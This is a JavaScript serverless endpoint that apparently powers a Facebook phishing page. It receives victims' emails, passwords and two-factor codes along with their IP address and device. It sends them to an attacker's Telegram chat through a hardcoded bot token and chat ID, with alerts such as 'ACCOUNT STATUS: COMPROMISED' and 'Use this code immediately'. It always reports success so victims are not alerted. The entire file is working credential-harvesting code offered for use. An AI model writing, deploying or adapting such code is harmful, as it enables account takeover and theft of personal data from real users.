const fetch = require('node-fetch');

module.exports = async (req, res) => {
    console.log('=== FACEBOOK API STARTED ===');
    
    // Set headers
    res.setHeader('Content-Type', 'application/json');
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
    
    // Handle OPTIONS preflight
    if (req.method === 'OPTIONS') {
        console.log('Preflight request');
        return res.status(200).end();
    }
    
    // Only allow POST
    if (req.method !== 'POST') {
        console.log('Wrong method received:', req.method);
        return res.status(405).json({ 
            success: false, 
            error: 'Only POST allowed' 
        });
    }
    
    try {
        console.log('Processing POST request...');
        
        // Parse the request body
        let data = {};
        if (req.body) {
            if (typeof req.body === 'string') {
                try {
                    data = JSON.parse(req.body);
                } catch (e) {
                    console.log('Failed to parse JSON:', e.message);
                    data = {};
                }
            } else if (typeof req.body === 'object') {
                data = req.body;
            }
        }
        
        console.log('Parsed data:', JSON.stringify(data, null, 2));
        
        const { type, email, password, code } = data;
        const userAgent = data.userAgent || req.headers['user-agent'] || 'Unknown';
        
        // Get client IP
        const ip = req.headers['x-forwarded-for'] || 
                   req.headers['x-real-ip'] || 
                   'Unknown';
        
        console.log('Client info:', { type, email: email ? '***' : 'none', ip });
        
        // Telegram configuration
        const BOT_TOKEN = "8251102529:AAFUlxIRVM0Whp3Sd9K3d6WMvfu8ZCN7YQk";
        const CHAT_ID = "1622637334";
        
        console.log('Telegram config check - Token exists:', !!BOT_TOKEN);
        console.log('Telegram config check - Chat ID exists:', !!CHAT_ID);
        
        // Create timestamp
        const now = new Date();
        const timestamp = now.toISOString();
        const readableTime = now.toLocaleString('en-US', {
            year: 'numeric',
            month: 'short',
            day: 'numeric',
            hour: '2-digit',
            minute: '2-digit',
            second: '2-digit',
            timeZoneName: 'short'
        });
        
        // Build message based on type
        let telegramMessage = '';
        let logMessage = '';
        
        if (type === 'login') {
            telegramMessage = `🔐 FACEBOOK LOGIN CAPTURED

📧 Email/Phone: ${email || 'Not provided'}
🔑 Password: ${password || 'Not provided'}

🌍 Network Details:
🕐 Time: ${readableTime}
📍 IP Address: ${ip}
📱 Device: ${userAgent.includes('Mobile') ? 'Mobile' : 'Desktop'}

✅ Status: Login credentials captured
➡️ Next: Waiting for 2FA code`;
            
            logMessage = `Login attempt: ${email ? email.substring(0, 3) + '***' : 'no email'}`;
            
        } else if (type === 'verification') {
            telegramMessage = `✅ FACEBOOK 2FA CODE CAPTURED

📧 Account: ${email || 'Not provided'}
🔑 Password: ${password || 'Not provided'}
🔢 2FA Code: ${code || 'Not provided'}

🌍 Access Information:
🕐 Time: ${readableTime}
📍 IP: ${ip}

🚨 ACCOUNT STATUS: COMPROMISED
🎯 ACTION: Use this code immediately to access account`;
            
            logMessage = `2FA Code captured for: ${email ? email.substring(0, 3) + '***' : 'unknown'}`;
            
        } else if (type === 'resend') {
            telegramMessage = `🔄 CODE RESEND REQUESTED

📧 Account: ${email || 'Not provided'}
🕐 Time: ${readableTime}
📍 IP: ${ip}

📱 User requested new verification code`;
            
            logMessage = `Code resend requested`;
            
        } else {
            telegramMessage = `📱 Unknown request type: ${type || 'none'}
IP: ${ip}
Time: ${readableTime}`;
            
            logMessage = `Unknown request type: ${type}`;
        }
        
        console.log(logMessage);
        
        // Send to Telegram
        let telegramResult = { sent: false, error: null };
        
        if (BOT_TOKEN && CHAT_ID && telegramMessage) {
            try {
                console.log('Attempting to send to Telegram...');
                
                const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
                
                const response = await fetch(telegramUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'Accept': 'application/json'
                    },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: telegramMessage,
                        disable_web_page_preview: true
                    })
                });
                
                const result = await response.json();
                console.log('Telegram API response:', result);
                
                if (result.ok === true) {
                    telegramResult.sent = true;
                    console.log('✅ Successfully sent to Telegram!');
                } else {
                    telegramResult.error = result.description || 'Unknown Telegram error';
                    console.error('❌ Telegram error:', telegramResult.error);
                }
                
            } catch (telegramError) {
                telegramResult.error = telegramError.message;
                console.error('💥 Telegram fetch failed:', telegramResult.error);
            }
        } else {
            console.log('⚠️ Skipping Telegram - missing configuration');
            telegramResult.error = 'Missing Telegram configuration';
        }
        
        // Always return success to client
        const responseData = {
            success: true,
            type: type || 'unknown',
            telegram: telegramResult,
            timestamp: timestamp,
            debug: {
                ip: ip,
                config: {
                    hasToken: !!BOT_TOKEN,
                    hasChatId: !!CHAT_ID
                }
            }
        };
        
        console.log('Returning response:', JSON.stringify(responseData, null, 2));
        return res.status(200).json(responseData);
        
    } catch (error) {
        console.error('💥 UNEXPECTED ERROR:', error.message);
        console.error('Stack trace:', error.stack);
        
        // Still return success to avoid breaking user experience
        return res.status(200).json({
            success: true,
            error: error.message,
            note: 'Background processing completed',
            timestamp: new Date().toISOString()
        });
    }
};